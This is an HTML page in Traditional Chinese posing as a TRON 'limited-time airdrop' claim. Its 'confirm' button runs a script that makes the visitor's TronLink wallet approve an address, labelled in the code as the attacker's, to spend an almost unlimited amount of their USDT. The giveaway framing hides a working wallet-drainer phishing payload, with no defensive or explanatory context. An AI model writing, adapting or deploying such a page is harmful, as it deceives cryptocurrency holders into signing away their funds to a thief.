<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>🎁 領取空投（TRON）</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <style>
    body { font-family: 'Arial'; background: #f9f9f9; text-align: center; padding: 80px; }
    button {
      padding: 12px 30px;
      font-size: 20px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    #status { margin-top: 20px; font-size: 16px; color: #555; }
  </style>
</head>
<body>
  <h1>🎉 恭喜你獲得 TRON 限時空投</h1>
  <p>點擊下方按鈕確認參與活動</p>
  <button onclick="approve()">✅ 確認</button>
  <p id="status">等待操作中...</p>

  <script>
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20 USDT 主網
    const ATTACKER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";     // 攻擊者地址
    const ABI = [
      { "constant": false, "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ], "name": "approve", "outputs": [
        { "name": "success", "type": "bool" }
      ], "type": "function" }
    ];

    async function approve() {
      if (typeof window.tronWeb === 'undefined' || !tronWeb.defaultAddress.base58) {
        alert("請先安裝並登入 TronLink 錢包");
        return;
      }

      document.getElementById("status").innerText = "⏳ 發送授權中...";

      try {
        const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
        const tx = await contract.approve(ATTACKER, "9223372036854775807").send();
        document.getElementById("status").innerText = "✅ 授權成功，TX Hash: " + tx;
      } catch (e) {
        document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;
      }
    }
  </script>
</body>
</html>
